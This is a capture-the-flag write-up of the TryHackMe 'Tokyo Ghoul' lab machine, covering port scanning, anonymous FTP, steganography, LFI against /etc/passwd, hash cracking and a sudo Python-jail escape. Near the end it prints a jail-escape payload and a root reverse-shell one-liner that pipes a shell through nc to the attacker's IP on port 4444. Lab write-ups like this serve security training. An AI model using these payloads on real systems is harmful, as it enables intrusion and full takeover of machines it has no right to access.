---
layout: project
type: project
image: images/writeups/thm/tokyo-ghoul/logo.jpeg
title: Tokyo Ghoul - TryHackMe
permalink: writeups/tokyo-ghoul
# All dates must be YYYY-MM-DD format!
date: 2021-03-18
labels:
  - TryHackMe
  - boot2root
  - Medium
  - LFI
  - Python Sandbox
  - Enumeration
summary: Help kaneki escape jason room in this Tokyo Ghoul inspired machine.
---

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/header.png">
<script src="https://www.tryhackme.com/badge/192700"></script>

```
MACHINE = Tokyo Ghoul
TARGET = VARIABLE
OS = LINUX
DIFFICULTY = MEDIUM
```

## Enumeration

Starting off with rustscan to quickly scan all ports

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/1.png">

Performing a full scan with nmap on those ports

```
┌──(root💀Toyin)-[~/infosec/thm/tokyo-ghoul]
└─# nmap -sS -T4 -A -p 21,22,80 -oN nmap 10.10.7.110
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-18 20:28 WAT
Nmap scan report for 10.10.7.110
Host is up (0.18s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    3 ftp      ftp          4096 Jan 23 22:26 need_Help?
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to ::ffff:10.8.169.153
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 fa:9e:38:d3:95:df:55:ea:14:c9:49:d8:0a:61:db:5e (RSA)
|   256 ad:b7:a7:5e:36:cb:32:a0:90:90:8e:0b:98:30:8a:97 (ECDSA)
|_  256 a2:a2:c8:14:96:c5:20:68:85:e5:41:d0:aa:53:8b:bd (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Welcome To Tokyo goul
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   196.06 ms 10.8.0.1
2   196.02 ms 10.10.7.110

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 23.64 seconds
```

I added the target IP to my /etc/hosts as ghoul.thm so i won't have to type the IP all the time

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/2.png">

### FTP

Starting my poking around on ftp port 21 since anonymous login is available and nmap showed an intersting file present

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/3.png">

Looking further into the files i find need_to_talk to be an executable. I ran it and got some useful information back. I used rabin2 to read the strings from the data section and found what was likely to be the passphrase

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/3-1.png">

After getting the “passphrase” I decided to try it to extract data from the image i got from the ftp. I ended up with dots and dashes, so morse code, and went to my trusty chef to cook up something

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/4.png">

After tweaking the recipe I got what was surely a hidden directory

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/5.png">

### HTTP

Looking at the source for http://ghoul.thm I see a hint about anonymous ftp login but I've already done that same hint in http://ghoul.thm/jasonroom.html
Going into the directory I found, I see clear instructions to scan it so it would be quite rude not to

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/6.png">

gobuster took it's time but returned something. i should have probably used ffuf instead

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/7.png">

## Exploitation

Going to page i find that the links have get parameters that could possibly be LFI exploitable

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/8.png">

Trying basic LFI payload of ../../../../../../etc/passwd returned a message of “no no no silly don't do that” so i used ffuf to test various payloads and got a hit

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/9.png">

I used curl to get the contents and luckily also got a password hash for the user kamishiro

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/10.png">

Cracking the hash using hashcat i got the password for kamishiro and then logged in via ssh

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/11.png">

## Privilege Escalation

Upon logging in I ran "sudo -l" to see what sudo privileges the user had. I found that the user could execute a certain script as root
Checking the script it showed that it uses the “exec()” function therefore it can execute user input. It does have some filters so i would have to use a payload that doesn't include any of those

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/12.png">

using the payload below i was able to bypass the “python sandbox/jail”

```
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('cmd')
```
reference: [Escaping Python Jails](https://anee.me/escaping-python-jails-849c65cf306e)

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/13.png">

Using the payload below to get a reverse shell as root

```
__builtins__.__dict__['__IMPORT__'.lower()]('OS'.lower()).__dict__['SYSTEM'.lower()]('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.169.153 4444 >/tmp/f')
```

<img class="ui image" src="{{ site.baseurl }}/images/writeups/thm/tokyo-ghoul/14.png">

pwned
